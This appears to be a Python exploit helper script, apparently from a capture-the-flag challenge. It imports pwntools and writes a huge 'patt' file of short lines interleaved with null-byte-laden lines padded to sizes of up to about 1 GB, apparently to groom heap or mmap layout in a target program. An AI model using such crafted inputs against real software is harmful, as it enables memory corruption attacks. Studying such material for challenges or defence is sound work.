#!/usr/bin/env python3

import sys
from pwn import *
import time

def size():
    n = 128
    while True:
        yield n
        n = 2*n + 2

MAX_LEN = 1090519038
NUM_PATTERNS = 0xc600

MMAP_SIZE = 128*1024
longstr = b'y'*MAX_LEN

gen = size()
sizes = [133118, 266238, 532478, 1064958, 2129918, 4259838, 8519678, 17039358, 34078718, 68157438, 136314878, 272629758, 545259518, 1090519038]

# need to make the pattern chunk smaller

start = time.time()
print("Making pattern file...")
file = open("patt", "wb")
# file.write(b'a'*(MAX_LEN//2 - 2) + b'\n')
# n = 32
# for i in range(n):
#     file.write(b'a'*(MAX_LEN//n - 1) + b'\n')

# n = next(gen)
# while n <= MAX_LEN:
#     if n < MMAP_SIZE:
#         n = next(gen)
#         continue
#     file.write(b'a'*MMAP_SIZE + b'\x00' + b'b'*(n - 2 - MMAP_SIZE) + b'\n')
#     MMAP_SIZE *= 2
#     n = next(gen)

# file.write(b'a'*MMAP_SIZE + b'\x00' + b'b'*((MAX_LEN//2 - 2) - 2 - MMAP_SIZE) + b'\n')
# file.write(longstr)

for i in range(0xc600): # p 6
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0xc600}")

file.write(b'a\x00'+b'a'*133114+b'\n') # ds 1

for i in range(0x300): # p 6+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x300}")

file.write(b'a\x00'+b'a'*1064954+b'\n') # ds 8

for i in range(0x1cd00): # p 13+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x1cd00}")

file.write(b'a\x00'+b'a'*4259834+b'\n') # ds 32

for i in range(0x56400): # p 34+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x56400}")

file.write(b'a\x00'+b'a'*17039354+b'\n') # ds 128

for i in range(0x10e000): # p 100+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x10e000}")

file.write(b'a\x00'+b'a'*34078714+b'\n') # ds 256

for i in range(0x3a2000): # p 328+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x3a2000}")

file.write(b'a\x00'+b'a'*136314874+b'\n') # ds 1024

for i in range(0x94c000): # p 912+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x94c000}")

file.write(b'a\x00'+b'a'*272629754+b'\n') # ds 2048

for i in range(0x1ec8000): # p 2848+
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{0x1ec8000}")

file.write(b'a\x00'+b'a'*1090519034+b'\n') # ds 2048

file.close()
print("Finished in {:.3f} seconds.".format(time.time()-start))